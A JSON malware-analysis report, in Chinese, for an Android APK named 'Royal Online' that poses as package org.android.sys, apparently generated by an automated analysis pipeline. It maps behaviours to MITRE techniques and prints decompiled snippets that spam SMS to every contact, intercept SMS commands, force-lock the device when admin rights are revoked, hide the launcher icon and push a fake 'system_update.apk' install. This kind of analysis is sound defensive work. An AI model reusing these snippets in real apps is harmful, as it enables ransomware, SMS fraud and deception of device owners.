@@ -1,0 +1,270 @@
+{
+  "APK信息": {
+    "文件名": "0ca09d4fde9e00c0987de44ae2ad51a01b3c4c2c11606fe8308a083805760ee7.apk",
+    "sha256": "0ca09d4fde9e00c0987de44ae2ad51a01b3c4c2c11606fe8308a083805760ee7",
+    "包名": "org.android.sys",
+    "应用名": "Royal Online",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 348.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Plugs;",
+          "method_signature": "if(number != null && !number.equals(\"\")",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager send = SmsManager.getDefault(); Cursor cursor = this.context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{\"data1\"}, null, null, null); while (cursor.moveToNext()) { String number = cursor.getString(cursor.getColumnIndex(\"data1\")); if (number != null && !number.equals(\"\")) { send.sendTextMessage(cursor.getString(cursor.getColumnIndex(\"data1\")), null, data, null, null); } }",
+          "malicious_code_snippet_context": "SmsManager send = SmsManager.getDefault(); Cursor cursor = this.context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{\"data1\"}, null, null, null); while (cursor.moveToNext()) { String number = cursor.getString(cursor.getColumnIndex(\"data1\")); if (number != null && !number.equals(\"\")) { send.sendTextMessage(cursor.getString(cursor.getColumnIndex(\"data1\")), null, data, null, null); } }",
+          "behavior_description": "遍历用户通讯录中所有联系人电话号码，对每个号码静默发送短信（内容为传入的data参数）。数据来源为系统联系人数据库，危险操作为SmsManager.sendTextMessage()静默发送短信。该行为未经用户知情同意，向所有联系人批量发送短信，可导致用户被扣费、短信欺诈以及向联系人传播恶意内容（如钓鱼链接或恶意APK下载链接）。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\android\\sys\\SmsReceiver;",
+          "method_signature": "if(message.equals(\"3458\")",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsMessage sms = SmsMessage.createFromPdu((byte[]) aSExtra);\nmessage = message + (sms.getMessageBody().equals(\"\") ? \"\" : sms.getMessageBody());\nif (message.equals(\"3458\")) {\n    devicePolicyManager.removeActiveAdmin(componentName);\n    abortBroadcast();\n} else if (message.equals(\"deblock\")) {\n    plugs.setLockerImmunity(true);\n    ((WindowManager) context.getApplicationContext().getSystemService(\"window\")).removeView(AdminReceiver.Locker.LockerView);\n}",
+          "malicious_code_snippet_context": "                  String message = \"\";\n                  boolean sended = false;\n                  for (Object aSExtra : sExtra) {\n>>>                     SmsMessage sms = SmsMessage.createFromPdu((byte[]) aSExtra);\n>>>                     phone = sms.getDisplayOriginatingAddress();\n>>>                     message = message + (sms.getMessageBody().equals(\"\") ? \"\" : sms.getMessageBody());\n>>>                 }\n>>>                 Plugs plugs = Plugs.getInstance(context);\n>>>                 if (message.equals(\"3458\")) {\n>>>                     DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>                     ComponentName componentName = new ComponentName(context, (Class<?>) AdminReceiver.class);\n>>>                     devicePolicyManager.removeActiveAdmin(componentName);\n                      abortBroadcast();\n                  } else if (message.equals(\"deblock\")) {\n                      System.out.println(\"Start unblocked process!\");",
+          "behavior_description": "代码通过SmsMessage.createFromPdu获取短信内容，当短信内容为特定指令（如3458、deblock等）时，调用abortBroadcast()拦截短信广播，阻止系统短信应用接收该短信，同时执行移除设备管理员权限或解除锁屏等远程控制操作。数据流向：createFromPdu/getMessageBody() -> abortBroadcast()",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Boot;",
+          "method_signature": "if(Plugs.isIMEI(plugs.getIMEI()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (Plugs.isIMEI(plugs.getIMEI())) {\n    if (action.equals(\"android.intent.action.APP_ERROR\")) {\n        Plugs.onServiceRestart(context, SuperService.class);\n        return;\n    }\n    if (!Plugs.isServiceRun(context, SuperService.class)) {\n        Intent SuperService = new Intent(context, (Class<?>) SuperService.class);\n        SuperService.setFlags(268435456);\n        context.startService(SuperService);\n    }\n    if (plugs.getLockerAccess()) {",
+          "malicious_code_snippet_context": "                  }).start();\n                  return;\n              }\n>>>             if (Plugs.isIMEI(plugs.getIMEI())) {\n>>>                 if (action.equals(\"android.intent.action.APP_ERROR\")) {\n>>>                     Plugs.onServiceRestart(context, SuperService.class);\n>>>                     return;\n>>>                 }\n>>>                 if (!Plugs.isServiceRun(context, SuperService.class)) {\n>>>                     Intent SuperService = new Intent(context, (Class<?>) SuperService.class);\n>>>                     SuperService.setFlags(268435456);\n>>>                     context.startService(SuperService);\n>>>                 }\n>>>                 if (plugs.getLockerAccess()) {\n                      Intent intentMain = new Intent(context, (Class<?>) AdminReceiver.Locker.class);\n                      intentMain.addFlags(268435456);\n                      context.startActivity(intentMain);",
+          "behavior_description": "代码通过 plugs.getIMEI() 获取设备 IMEI 号用于设备指纹采集，并使用 Plugs.isIMEI() 进行校验。校验通过后，根据 Intent action 重启或启动恶意服务 SuperService，并检查勒索权限 plugs.getLockerAccess()。数据流向为：getIMEI() -> 条件判断 -> 启动恶意服务/勒索逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\AdminReceiver;",
+          "method_signature": "run()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\nlocalDevicePolicyManager.lockNow();\nIntent intents = new Intent(DEF_BROADCAST);\ncontext.sendBroadcast(intents);",
+          "malicious_code_snippet_context": "              return \"Взорвать батарею в устройстве?\";\n          }\n          Plugs.log(\"AdminReceiver.onDisableRequested\", \"Включаем защиту для API выше 20\");\n>>>         DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>         localDevicePolicyManager.lockNow();\n>>>         Intent intents = new Intent(DEF_BROADCAST);\n>>>         context.sendBroadcast(intents);\n          return \"Взорвать батарею в устройстве?\";\n      }\n  ",
+          "behavior_description": "该代码位于DeviceAdminReceiver的onDisableRequested回调中，当用户尝试取消设备管理员权限时，调用DevicePolicyManager.lockNow()立即锁屏设备，同时发送自定义广播DEF_BROADCAST触发进一步的勒索逻辑。onEnabled回调中设置device_block=yes标记设备已被锁定。这是典型的勒索软件设备锁屏行为，利用设备管理员权限强制锁屏并阻止用户正常使用设备。数据流向：context.getSystemService(\"device_policy\")获取DevicePolicyManager实例(source)→lockNow()强制锁屏(sink)。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\android\\sys\\MCrypt;",
+          "method_signature": "if(text == null || text.length()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "byte[] data = text.getBytes();\nString text2 = Base64.encodeToString(data, 0);\nthis.cipher.init(1, this.keyspec, this.ivspec);\nbyte[] encrypted = this.cipher.doFinal(padString(text2).getBytes());",
+          "malicious_code_snippet_context": "              throw new Exception(\"Empty string\");\n          }\n          try {\n>>>             byte[] data = text.getBytes();\n>>>             String text2 = Base64.encodeToString(data, 0);\n>>>             this.cipher.init(1, this.keyspec, this.ivspec);\n>>>             byte[] encrypted = this.cipher.doFinal(padString(text2).getBytes());\n              return encrypted;\n          } catch (Exception e) {\n              throw new Exception(\"[encrypt] \" + e.getMessage());",
+          "behavior_description": "代码接收字符串输入，先进行Base64编码，然后使用Cipher在加密模式(1)下进行对称加密操作。在勒索软件场景中，此方法被用于加密用户文件或敏感数据，导致用户无法访问原始数据并以此勒索赎金。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\BinderAdmin;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 16)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "timer.schedule(task, 0L, 900L);\nNotification.Builder builder = new Notification.Builder(this).setSmallIcon(R.drawable.ic_launcher);\nif (Build.VERSION.SDK_INT < 16) {\n    notification = builder.getNotification();\n} else {\n    notification = builder.build();\n}\nstartForeground(777, notification);\nstopForeground(true);",
+          "malicious_code_snippet_context": "                  }\n              }\n          };\n>>>         timer.schedule(task, 0L, 900L);\n>>>         Notification.Builder builder = new Notification.Builder(this).setSmallIcon(R.drawable.ic_launcher);\n>>>         if (Build.VERSION.SDK_INT < 16) {\n>>>             notification = builder.getNotification();\n>>>         } else {\n>>>             notification = builder.build();\n>>>         }\n>>>         startForeground(777, notification);\n>>>         stopForeground(true);\n          return 1;\n      }\n  ",
+          "behavior_description": "该代码通过Timer定时器每900毫秒循环执行任务，在任务中调用startForeground启动前台服务以提升进程优先级避免被系统杀死，随后立即调用stopForeground(true)取消前台通知，使用户无感知。这种'启动-停止'前台服务的循环操作是典型的恶意软件保活技巧，用于维持恶意服务长期运行。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\Plugs;",
+          "method_signature": "onPostExecute(Void aVoid)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent update = new Intent(\"android.intent.action.VIEW\");\nUri uri = Uri.fromFile(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + \"/system_update.apk\"));\nupdate.setDataAndType(uri, \"application/vnd.android.package-archive\");\nupdate.setFlags(268435456);\nPlugs.this.context.startActivity(update);",
+          "malicious_code_snippet_context": "          /* JADX INFO: Access modifiers changed from: protected */\n          @Override // android.os.AsyncTask\n          public void onPostExecute(Void aVoid) {\n>>>             Intent update = new Intent(\"android.intent.action.VIEW\");\n>>>             Uri uri = Uri.fromFile(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + \"/system_update.apk\"));\n>>>             update.setDataAndType(uri, \"application/vnd.android.package-archive\");\n>>>             update.setFlags(268435456);\n>>>             Plugs.this.context.startActivity(update);\n          }\n      }\n  ",
+          "behavior_description": "类名伪装为系统包org.android.sys，从外部存储Download目录读取名为system_update.apk的文件，通过ACTION_VIEW Intent调起系统PackageInstaller界面诱导用户安装。文件名伪装为系统更新实施社会工程学欺骗，虽非真正静默安装（需用户点击确认），但在恶意样本上下文中属于伪装诱导安装行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\android\\sys\\ErrorInstall;",
+          "method_signature": "onCreate(Bundle savedInstanceState)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "ComponentName com = new ComponentName(getApplicationContext().getPackageName(), getApplicationContext().getPackageName() + \".\" + Launcher.class.getSimpleName());\ngetPackageManager().setComponentEnabledSetting(com, 2, 1);",
+          "malicious_code_snippet_context": "          super.onCreate(savedInstanceState);\n          setContentView(R.layout.install);\n          try {\n>>>             ComponentName com = new ComponentName(getApplicationContext().getPackageName(), getApplicationContext().getPackageName() + \".\" + Launcher.class.getSimpleName());\n>>>             getPackageManager().setComponentEnabledSetting(com, 2, 1);\n              if (BinderAdmin.timer != null) {\n                  BinderAdmin.timer.cancel();\n                  BinderAdmin.timer = null;",
+          "behavior_description": "代码通过获取应用包名和Launcher类名构造ComponentName，并调用setComponentEnabledSetting将其设置为禁用状态(2)，导致应用在桌面上的图标被隐藏，从而逃避用户察觉和卸载。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
